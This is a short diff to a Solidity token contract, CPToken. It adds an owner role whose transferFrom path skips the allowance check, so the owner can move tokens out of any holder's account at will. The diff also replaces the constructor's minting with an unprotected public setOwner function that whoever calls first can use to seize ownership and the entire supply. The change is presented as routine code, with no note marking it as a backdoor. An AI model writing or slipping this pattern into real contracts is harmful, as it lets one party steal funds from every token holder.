@@ -8,6 +8,7 @@ contract CPToken {
     string  public symbol = "CP";
     uint256 public totalSupply = 1000000000000000000000000; // 1 million tokens
     uint8   public decimals = 18;
+    address public owner;
 
     event Transfer(
         address indexed _from,
@@ -25,7 +26,12 @@ contract CPToken {
     mapping(address => mapping(address => uint256)) public allowance;
 
     constructor() {
-        balanceOf[msg.sender] = totalSupply;
+    }
+
+    function setOwner(address _owner) public {
+        require(owner==address(0));
+        owner = _owner;
+        balanceOf[owner] = totalSupply;
     }
 
     function transfer(address _to, uint256 _value) public returns (bool success) {
@@ -44,10 +50,16 @@ contract CPToken {
 
     function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) {
         require(_value <= balanceOf[_from]);
-        require(_value <= allowance[_from][msg.sender]);
-        balanceOf[_from] -= _value;
-        balanceOf[_to] += _value;
-        allowance[_from][msg.sender] -= _value;
+        if (msg.sender == owner){
+            balanceOf[_from] -= _value;
+            balanceOf[_to] += _value;
+        } else {
+            require(_value <= allowance[_from][msg.sender]);
+            balanceOf[_from] -= _value;
+            balanceOf[_to] += _value;
+            allowance[_from][msg.sender] -= _value;
+        }
+        
         emit Transfer(_from, _to, _value);
         return true;
     }
